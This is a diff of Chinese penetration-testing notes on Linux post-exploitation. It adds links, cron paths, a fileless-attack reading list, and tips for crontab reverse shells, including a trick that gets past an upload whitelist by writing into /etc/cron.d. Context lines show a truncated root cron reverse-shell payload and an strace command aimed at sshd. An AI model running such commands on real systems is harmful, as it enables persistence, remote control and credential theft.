@@ -24,6 +24,7 @@
 
 **相关资源**
 - [GTFOBins](https://gtfobins.github.io/)
+- https://github.com/LOLBAS-Project/LOLBAS
 
 **相关工具**
 - [sameera-madushan/Print-My-Shell](https://github.com/sameera-madushan/Print-My-Shell) - 自动化生成各种类型的反向 Shell
@@ -338,12 +339,19 @@ systemctl status network.service    # 可以看到 id 已经执行
 **相关文章**
 - [Linux Crontab定时任务反弹shell的坑](https://joychou.org/hostsec/linux-crontab-rebound-shell-hole.html)
 
+**Tips**
+- ubuntu 不能使用 bash 反弹 shell,可以用python，perl反弹
+- ubuntu 用户的定时任务在 /var/spool/cron/crontabs/ 目录下
+- ubuntu 用户定时任务必须在 600 权限才能执行
+- 如果做了白名单后缀,只允许 jpg ,可以传到 `/etc/cron.d/` 目录下,这里文件可以任意后缀命名,上传文件名为 `test.jpg` 绕过对应的安全检查
+
 **一些路径**
 ```
+centos 的定时任务在 /var/spool/cron/root/
+ubuntu 的定时任务在 /var/spool/cron/crontabs/root/
+
 /etc/crontab
 /etc/cron.d/
-/var/spool/cron/crontabs/
-/var/spool/cron/root
 ```
 
 **payload**
@@ -354,13 +362,6 @@ echo "* * * * * root /usr/bin/python -c 'import socket,subprocess,os;s=socket.so
 
 echo "* * * * * root echo 'success' > /tmp/crontest" >> /etc/cron.d/test123.cron
 ```
-
-**Tips**
-- 定时任务的报错可以通过查看 `ca` 来排错
-- ubuntu 不能使用 bash 反弹 shell
-- ubuntu 用户的定时任务在 /var/spool/cron/crontabs/ 目录下
-- ubuntu 用户定时任务必须在 600 权限才能执行
-- 如果做了白名单后缀,只允许 jpg ,可以传到 `/etc/cron.d/` 目录下,这里文件可以任意后缀命名,上传文件名为 `test.jpg` 绕过对应的安全检查
 
 ---
 
@@ -391,3 +392,12 @@ strace -xx -fp `cat /var/run/sshd.pid` 2>&1| grep --line-buffered -P 'write\(\d,
 ### 权限提升
 
 - 参考 [权限提升](../后渗透/权限提升.md#linux) 中的 linux 部分
+
+---
+
+## 无文件攻击
+
+**相关文章**
+- [如何使用命令行对无文件恶意软件进行取证](https://www.anquanke.com/post/id/210696)
+- [Linux无文件渗透执行ELF](https://www.secpulse.com/archives/70269.html)
+- [In-Memory-Only ELF Execution (Without tmpfs)](https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html)
